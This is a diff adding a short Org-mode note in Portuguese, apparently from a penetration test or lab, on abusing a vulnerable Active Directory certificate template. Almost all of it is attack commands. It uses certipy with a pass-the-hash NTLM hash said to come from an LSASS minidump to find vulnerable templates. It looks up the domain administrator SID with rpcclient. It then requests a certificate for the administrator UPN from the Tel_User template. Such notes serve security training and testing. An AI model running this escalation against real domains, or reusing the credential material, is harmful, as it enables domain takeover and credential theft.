@@ -1,0 +1,32 @@
+#+title: Vulnerable Certificates Templates
+#+author:gabriel
+
+* certipy-ad
+install with pipx -->
+#+begin_src sh
+pipx install certipy-ad
+#+end_src
+
+com o user tel_enginner hash, que foi obtido com o minidump do lsass -->
+#+begin_src sh
+certipy find -u 'tel_engineer01@telecore.ad' -hashes :e2b1996aaff0f57bccb916265a77970e
+ -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout
+#+end_src
+
+pegar o SID domain admin -->
+#+begin_src sh
+rpcclient --user 'telecore.ad/tel_engineer01' --pw-nt-hash 10.5.2.2 -c "lookupnames administrator"
+Password for [TELECORE.AD\tel_engineer01]:
+administrator S-1-5-21-1588247407-410625039-1511794522-500 (User: 1)
+#+end_src
+
+fazendo a request para o template vulneravel  -->
+#+begin_src sh
+certipy req -debug -u 'tel_engineer01@telecore.ad' \
+-hashes :e2b1996aaff0f57bccb916265a77970e \
+-target 10.5.2.8 \
+-ca 'telecore-PKI-SRV-CA' \
+-template Tel_User \
+-upn 'administrator@telecore.ad' \
+-sid S-1-5-21-1588247407-410625039-1511794522-500
+#+end_src
